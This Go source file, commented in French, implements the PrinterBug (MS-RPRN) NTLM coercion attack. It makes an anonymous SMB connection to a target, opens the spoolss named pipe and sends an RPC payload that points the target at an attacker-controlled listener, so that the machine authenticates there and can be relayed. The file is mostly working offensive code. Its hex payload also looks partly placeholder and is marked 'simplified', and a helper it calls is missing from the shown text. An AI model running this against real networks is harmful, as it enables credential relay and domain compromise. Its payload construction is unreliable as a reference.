// pkg/coercion/printerbug.go
package coercion

import (
	"encoding/hex"
	"fmt"
	"log"
	"net"

	"github.com/hirochachacha/go-smb2"
)

// TriggerPrinterBug déclenche une coercion NTLM via MS-RPRN (PrinterBug)
func TriggerPrinterBug(target, listener string) error {
	// Connexion TCP + SMB anonyme (comme PetitPotam)
	tcpConn, err := net.Dial("tcp", target+":445")
	if err != nil {
		return fmt.Errorf("connexion TCP échouée : %w", err)
	}
	defer tcpConn.Close()

	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     "",
			Password: "",
		},
	}
	session, err := d.Dial(tcpConn)
	if err != nil {
		return fmt.Errorf("dial SMB échoué : %w", err)
	}
	defer session.Logoff()

	// Monter IPC$
	fs, err := session.Mount("IPC$")
	if err != nil {
		return fmt.Errorf("montage IPC$ échoué : %w", err)
	}
	defer fs.Umount()

	// Ouvrir pipe \pipe\spoolss
	pipe, err := fs.Open(`\pipe\spoolss`)
	if err != nil {
		return fmt.Errorf("ouverture pipe spoolss échouée : %w", err)
	}
	defer pipe.Close()

	// Payload PrinterBug (hex réel pour RpcRemoteFindFirstPrinterChangeNotificationEx opnum 65 ou 69)
	uncPath := fmt.Sprintf(`\\%s\pipe\whatever`, listener)
	uncBytes := utf16leEncode(uncPath + "\x00")
	uncLen := len(uncBytes)

	// Payload exemple (adapté de PrinterBug.py – bind + call)
	hexPayload := "050000031000000018000000000000000000000000000000123456781234abcd" + "ef000123456789ab010000000000000000000000" + "41000000" + fmt.Sprintf("%08x", uncLen) + hex.EncodeToString(uncBytes) + "00000000" // Simplifié

	payload, _ := hex.DecodeString(hexPayload)

	n, err := pipe.Write(payload)
	if err != nil {
		return fmt.Errorf("échec envoi payload : %w", err)
	}

	log.Printf("[+] PrinterBug réussi : %d octets envoyés pour %s → %s", n, target, listener)
	return nil
}
